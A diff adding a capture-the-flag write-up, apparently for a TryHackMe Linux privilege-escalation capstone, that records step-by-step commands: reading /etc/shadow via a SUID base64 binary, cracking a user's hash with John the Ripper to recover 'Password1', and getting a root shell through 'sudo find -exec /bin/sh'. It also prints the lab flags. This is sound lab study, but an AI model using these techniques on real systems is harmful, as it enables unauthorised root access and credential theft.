@@ -793,4 +793,127 @@ uid=0(root) gid=0(root) groups=0(root),1001(karen)
 ## Capstone Challenge
 > You have gained SSH access to a large scientific facility. Try to elevate your privileges until you are Root.
 > Leave no privilege escalation vector unexplored, privilege escalation is often more an art than a science.
-* 
+
+### Enumeration
+* `hostname` : ip-10-10-91-89
+* `name -a` : Linux ip-10-10-91-89 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+* `cat /proc/version` : Linux version 3.10.0-1160.el7.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) ) #1 SMP Mon Oct 19 16:18:59 UTC 2020
+* `sudo -l` : Sorry, user leonard may not run sudo on ip-10-10-91-89.
+* `id` : uid=1000(leonard) gid=1000(leonard) groups=1000(leonard) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+* ```
+  history 
+    1  ls
+    2  cd ..
+    3  exit
+    4  ls
+    5  cd Ã§Ã§
+    6  cd ..
+    7  ls
+    8  cd home/
+    9  ls
+   10  cd missy/
+   11  su missy 
+   12  ls
+   13  cd ..
+   14  ls
+   15  cd rootflag/
+   16  ls
+   17  cat flag2.txt 
+   18  su root
+   19  ls
+   20  cd rootflag/
+   21  su missy
+```
+* No results using `find` to search for "flag".
+```
+find / -name flag 2>/dev/null
+```
+* No exploits for kernel 3.10.0-1160 found on [Exploit Database](https://www.exploit-db.com/).
+* `find / -type f -perm -04000 -ls 2>/dev/null` identified "base64" file with SUID (Set-user Identification) set.
+  * "base64" file appears as SUID exploit on [GTFOBins](https://gtfobins.github.io/#base64%20+suid).
+```
+16779966   40 -rwsr-xr-x   1 root     root        37360 Aug 20  2019 /usr/bin/base64
+```
+* Used SUID exploit to read `etc/shadow` file.
+```
+LFILE=/etc/shadow
+/usr/bin/base64 "$LFILE" | base64 --decode
+```
+* `history` output suggested that "missy" user may have access to "flag1.txt".
+```
+mkdir ./Desktop/Capstone
+cd ./Desktop/Capstone
+touch passwd.txt shadow.txt passwords.txt
+```
+* Copied missy's unshadowed password hash into "shadow.txt"
+```
+missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::
+```
+* Copied missy's user data from `etc/passwd` into "passwd.txt".
+```
+cat /etc/passwd | grep missy
+missy:x:1001:1001::/home/missy:/bin/bash
+```
+*  Used `unshadow` to create a file crackable by John the Ripper.
+```
+unshadow /root/Desktop/Capstone/passwd.txt /root/Desktop/Capstone/shadow.txt > /root/Desktop/Capstone/passwords.txt
+```
+* Used John to brute force missy's password.
+```
+john --wordlist=/usr/share/wordlists/rockyou.txt /root/Desktop/Capstone/passwords.txt 
+```
+* This recovered "Password1".
+* Used SSH to connect to target as missy.
+```
+ssh missy@10.10.91.89
+```
+* ```sudo -l
+Matching Defaults entries for missy on ip-10-10-91-89:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
+    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
+    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
+    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
+    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
+    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User missy may run the following commands on ip-10-10-91-89:
+    (ALL) NOPASSWD: /usr/bin/find
+```
+* ```history
+    1  ls
+    2  cd missy/
+    3  ls
+    4  cd Do
+    5  cd Documents
+    6  ls
+    7  cat flag1.txt 
+    8  su root
+    9  quit
+   10  sudo -l
+   11  find . -exec /bin/sh \; -quit
+   12  find -exec /bin/sh \; -quit
+   13  sudo find /home -exec /bin/bash \;
+   14  ls
+   15  cd leonard/
+   16  cd rootflag/
+   17  su root
+```
+* Recovered flag1.
+```
+cat ./Documents/flag1.txt` 
+THM-42828719920544
+```
+* `history` output of missy user suggets exploitation of `find` sodo dlegation.
+* GTFObins result for "find + sudo".
+> ## Sudo
+> If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
+> sudo find . -exec /bin/sh \; -quit
+> find / -name rootflag 2>/bin/null
+
+/home/rootflag
+
+s /home/rootflag/
+flag2.txt
+sh-4.2# cat /home/rootflag/flag2.txt 
+THM-168824782390238
